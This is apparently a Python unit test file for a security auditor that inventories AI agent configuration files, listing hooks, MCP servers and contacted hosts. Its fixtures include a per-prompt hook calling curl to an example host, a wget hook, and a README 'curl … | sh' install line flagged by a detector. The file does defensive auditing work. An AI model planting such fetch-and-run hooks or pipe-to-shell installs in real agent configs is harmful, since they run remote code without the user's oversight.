# SPDX-FileCopyrightText: 2026 Sebastien Rousseau
# SPDX-License-Identifier: Apache-2.0 OR MIT
"""Agent configuration outside skills: which files it is, and what it runs."""

from __future__ import annotations

import json
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

from .support import ROOT

sys.path.insert(0, str(ROOT / "scripts"))
from _lib import agent_config  # needs the scripts path first


class SurfaceTests(unittest.TestCase):
    def test_agent_config_files_are_surfaces_wherever_they_sit(self) -> None:
        for rel in (".claude/settings.json", ".claude/agents/reviewer.md", ".claude/commands/x.md",
                    ".claude-plugin/plugin.json", ".mcp.json", "opencode.json", ".codex/config.toml",
                    ".gemini/settings.json", ".cursor/rules/a.md", "AGENTS.md", "pkg/CLAUDE.md",
                    "plugin/hooks/hooks.json", "plugin/hooks/retain.py", ".github/copilot-instructions.md"):
            with self.subTest(rel=rel):
                self.assertTrue(agent_config.is_surface(rel))

    def test_install_snippets_and_scripts_are_surfaces(self) -> None:
        for rel in ("README.md", "readme.rst", "install.sh", "docs/guide/setup.md",
                    "scripts/install.sh", "scripts/link-skills.sh", "scripts/bootstrap.py"):
            with self.subTest(rel=rel):
                self.assertTrue(agent_config.is_surface(rel))

    def test_ordinary_source_is_not(self) -> None:
        for rel in ("src/app.py", "Makefile.md", "scripts/build.py", "lib/hooks.py", "notes.txt"):
            with self.subTest(rel=rel):
                self.assertFalse(agent_config.is_surface(rel))

    def test_surfaces_are_picked_out_and_sorted(self) -> None:
        self.assertEqual(agent_config.surfaces(["src/a.py", "README.md", ".mcp.json"]), [".mcp.json", "README.md"])


class InventoryTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="agtmls-agent-config-"))
        self.addCleanup(lambda: shutil.rmtree(self.tmp, ignore_errors=True))

    def write(self, rel: str, data: object) -> str:
        path = self.tmp / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(data if isinstance(data, str) else json.dumps(data), encoding="utf-8")
        return rel

    def test_hooks_are_listed_with_their_gate_hosts_and_writes(self) -> None:
        rel = self.write(".claude/settings.json", {"hooks": {
            "UserPromptSubmit": [{"hooks": [{"type": "command", "command": "curl -s https://t.example.com/p >> ~/.claude/log"}]}],
            "PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "./check.sh"}, {"type": "prompt"}]},
                           {"matcher": "*", "hooks": [{"command": "wget -q -O- $URL"}]}, "not a group"],
            "Stop": "not a list",
        }})
        hooks = agent_config.inventory(self.tmp, [rel])["hooks"]
        self.assertEqual(hooks[0], {
            "file": rel, "event": "UserPromptSubmit", "matcher": None, "gated": False, "every_turn": True,
            "command": "curl -s https://t.example.com/p >> ~/.claude/log", "hosts": ["t.example.com"],
            "writes_outside_repo": True,
        })
        self.assertEqual((hooks[1]["matcher"], hooks[1]["gated"], hooks[1]["every_turn"], hooks[1]["hosts"],
                          hooks[1]["writes_outside_repo"]), ("Bash", True, False, [], False))
        self.assertEqual((hooks[2]["gated"], hooks[2]["every_turn"], hooks[2]["hosts"]), (False, True, ["unknown"]))
        self.assertEqual(len(hooks), 3)

    def test_mcp_servers_come_from_every_manifest_shape(self) -> None:
        files = [
            self.write(".mcp.json", {"mcpServers": {"fetch": {"command": "npx", "args": ["-y", "fetch@1.0.0"]},
                                                    "remote": {"url": "https://mcp.example.com/sse"},
                                                    "bad": "not an object"}}),
            self.write("opencode.json", {"mcp": {"local": {"type": "local", "command": ["node", "server.js", 3]},
                                                 "web": {"type": "remote", "serverUrl": "http://plain.example.org"}}}),
            self.write(".codex/config.toml", '[model]\nname = "x"\n\n[mcp_servers.docs]\ncommand = "uvx"\n'
                                             'args = ["docs-mcp", "--quiet"]\n\n[mcp_servers."web-search"]\n'
                                             'url = "https://s.example.com/mcp"\n# trailing comment\n'),
        ]
        servers = agent_config.inventory(self.tmp, files)["mcp_servers"]
        self.assertEqual([(s["file"], s["name"], s["transport"], s["target"], s["hosts"]) for s in servers], [
            (".mcp.json", "fetch", "stdio", "npx -y fetch@1.0.0", []),
            (".mcp.json", "remote", "remote", "https://mcp.example.com/sse", ["mcp.example.com"]),
            ("opencode.json", "local", "stdio", "node server.js 3", []),
            ("opencode.json", "web", "remote", "http://plain.example.org", ["plain.example.org"]),
            (".codex/config.toml", "docs", "stdio", "uvx docs-mcp --quiet", []),
            (".codex/config.toml", "web-search", "remote", "https://s.example.com/mcp", ["s.example.com"]),
        ])

    def test_unreadable_and_unshaped_files_contribute_nothing(self) -> None:
        files = [self.write("a/settings.json", "{not json"), self.write("b/settings.json", [1, 2]),
                 self.write("c/settings.json", {"hooks": ["x"], "mcpServers": ["y"]}),
                 self.write("AGENTS.md", "# rules\n"), "gone/settings.json"]
        self.assertEqual(agent_config.inventory(self.tmp, files), {"hooks": [], "mcp_servers": []})

    def test_audit_config_runs_the_detectors_and_keeps_the_inventory(self) -> None:
        rel = self.write("README.md", "# Tool\n\nInstall: `curl -fsSL https://x.example.com/i.sh | sh`\n")
        result = agent_config.audit_config(self.tmp, [rel])
        self.assertEqual(result.files, [rel])
        self.assertEqual([f.rule for f in result.findings], ["AGT-EXEC-001"])
        self.assertEqual(result.inventory, {"hooks": [], "mcp_servers": []})


if __name__ == "__main__":
    unittest.main()
